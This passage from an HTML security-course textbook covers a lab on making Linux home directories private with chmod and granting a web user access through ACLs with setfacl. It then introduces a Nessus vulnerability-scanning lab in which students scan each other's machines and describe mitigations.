$ ls bob
$ ls carol
$ exit</code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td><code>su</code> allows us to assume the role of anyone, often it is used to assume the role of the <em>superuser</em></td>
</tr>
</table>
</div>
<div class="paragraph">
<p>The <code>ls</code> command was successful even though there were no files to look at.
If we weren&#8217;t able to view the contents, we would have received a permission denied error.
The <code>chmod</code> command is used to modify file permissions for a User (<code>u</code>), Group (<code>g</code>), Others (<code>o</code>), or All (<code>a</code>).
<code>chmod</code> can remove a permission with <code>-</code>, add a permission with <code>+</code>, or set a permission (removing others) with <code>=</code>.
Let&#8217;s use <code>chmod</code> to actually make these home directories private:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">root@11ce9e5ee80e:/home# chmod u=rwx,g=,o= alice
root@11ce9e5ee80e:/home# chmod u=rwx,g=,o= bob
root@11ce9e5ee80e:/home# chmod u=rwx,g=,o= carol
root@11ce9e5ee80e:/home# ls -l
total 12
drwx------ 2 alice alice 4096 Oct 28 01:28 alice
drwx------ 2 bob   bob   4096 Oct 28 01:28 bob
drwx------ 2 carol carol 4096 Oct 28 01:28 carol</code></pre>
</div>
</div>
<div class="paragraph">
<p>Things look much better, but let&#8217;s test it and see if dave can view any of the directories:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">root@11ce9e5ee80e:/home# su dave
$ ls alice
ls: cannot open directory 'alice': Permission denied
$ ls bob
ls: cannot open directory 'bob': Permission denied
$ ls carol
ls: cannot open directory 'carol': Permission denied
$ exit</code></pre>
</div>
</div>
<div class="paragraph">
<p>Lastly, lets make sure that alice can view the contents of her home directory:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">root@11ce9e5ee80e:/home# su alice
$ ls alice
$ exit</code></pre>
</div>
</div>
<div class="paragraph">
<p>Looks good!</p>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Using your first name (all lowercase) add yourself as a user and create a home directory for yourself.
Set the permissions such that only you can view the contents.
Show the permissions of the home directory and demonstrate that another users <em>cannot</em> view its contents.
Take a screenshot showing all of this and submit this as one of your deliverables.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Unfortunately traditional UNIX file permissions often do not provide the granularity needed in a modern system.
For example, lets assume that we wanted a web server to be able to view the contents of alice, bob, and carol&#8217;s home directories.
This is typically done to allow users to place a <code>public_html</code> directory in their home directory and set up a personal web space.
We could do this by making their home directories viewable by others, but then we have the same issue we started with.
We could also do this by changing the group ownership of their home directories to a group that the web server is part of, but then we open up the home directories to any other users or services that are part of that group.</p>
</div>
<div class="paragraph">
<p>The solution to this problem is to use Linux ACLs, which allow you to fine tune permissions.
Two commands, <code>setfacl</code> and <code>getfacl</code> are used to adjust Linux ACLs.
As an example let&#8217;s add an http user, use the <code>setfacl</code> command to explicitly give the http user read and execute permissions to all three directories, list the new permissions, and list the new ACLs:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">root@11ce9e5ee80e:/home# useradd http
root@11ce9e5ee80e:/home# setfacl -m u:http:rx alice bob carol
root@11ce9e5ee80e:/home# ls -l
total 12
drwxr-x---+ 2 alice alice 4096 Oct 28 01:28 alice <i class="conum" data-value="1"></i><b>(1)</b>
drwxr-x---+ 2 bob   bob   4096 Oct 28 01:28 bob
drwxr-x---+ 2 carol carol 4096 Oct 28 01:28 carol
root@11ce9e5ee80e:/home# getfacl alice bob carol
# file: alice
# owner: alice
# group: alice
user::rwx
user:http:r-x
group::---
mask::r-x
other::---

# file: bob
# owner: bob
# group: bob
user::rwx
user:http:r-x
group::---
mask::r-x
other::---

# file: carol
# owner: carol
# group: carol
user::rwx
user:http:r-x
group::---
mask::r-x
other::---</code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>Notice the <code>+</code> sign indicating there are extra permissions</td>
</tr>
</table>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Take a screenshot showing that the http user has access to each directory.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>When you are done, you can type exit to exit bash and stop the container.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_vulnerability_management_and_compliance">8. Vulnerability Management and Compliance</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_review_7">8.1. Review</h3>
<div class="sect3">
<h4 id="_labs_7">8.1.1. Labs</h4>
<div class="openblock lab">
<div class="title">Scanning with Nessus</div>
<div class="content">
<div class="paragraph">
<p>In this lab we will be downloading the Nessus vulnerability scanner and using it to scan a machine.
<a href="https://www.tenable.com/products/nessus/nessus-essentials">Click here to register for an activation code and receive a link to download Nessus essentials.</a>
Once you have installed the latest version of Nessus for your OS and completed the registration move on to the next steps.</p>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
Nessus runs a web interface on localhost with a self-signed certificate, so you will need to accept it to continue.
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Run <code>ipconfig</code> on a Windows device or <code>ifconfig</code> on a Mac to find your Wifi adapter IP address.
Exchange IP addresses with a friend (you will scan each other) and put your friend&#8217;s IP into the <em>Welcome to Nessus Essentials</em> dialog.
When you click <em>Next</em> Nessus will begin the host discovery step, making sure that the IP address you put in actually corresponds to an active host.
Click the checkbox next to the host once it shows up in <em>Host Discovery</em> and run the scan.
You&#8217;ll notice the status is <em>Running</em> while the scan is being performed.</p>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Once the scan is complete, take a look at the summary of vulnerabilities in the <em>Hosts</em> tab.
How many non-info vulnerabilities are there in each category (Low, Medium, High, Critical)?</p>
</div>
</td>
</tr>
</table>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Take a screenshot of the <em>Vulnerabilities</em> tab once the scan is complete.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Pick two vulnerabilities and describe them <em>in your own words</em>.
What mitigation steps could you take to eliminate these vulnerabilities?</p>
</div>
</td>
</tr>
</table>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>In the <em>VPR Top Threats</em> tab what is the assessed threat level?
What is <em>predictive prioritization</em> and why does Nessus use it?</p>
</div>
</td>
</tr>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="footnotes">
<hr>
<div class="footnote" id="_footnotedef_1">
<a href="#_footnoteref_1">1</a>. In actuality the code space was so small that you could even easily create a device to cycle through all possible codes in under a minute.
</div>
<div class="footnote" id="_footnotedef_2">
<a href="#_footnoteref_2">2</a>. This algorithm is so poor that it may be a stretch even to call it a hashing algorithm. That being said, it is being used as a tool to explain what hashes are.
</div>
<div class="footnote" id="_footnotedef_3">
<a href="#_footnoteref_3">3</a>. For an interesting example of how you can change but still follow a protocol, check out <a href="https://en.wikipedia.org/wiki/SYN_cookies">SYN cookies</a>.
</div>
</div>
<div id="footer">
<div id="footer-text">
Last updated 2022-01-31 22:07:09 UTC
</div>
</div>
</body>
</html>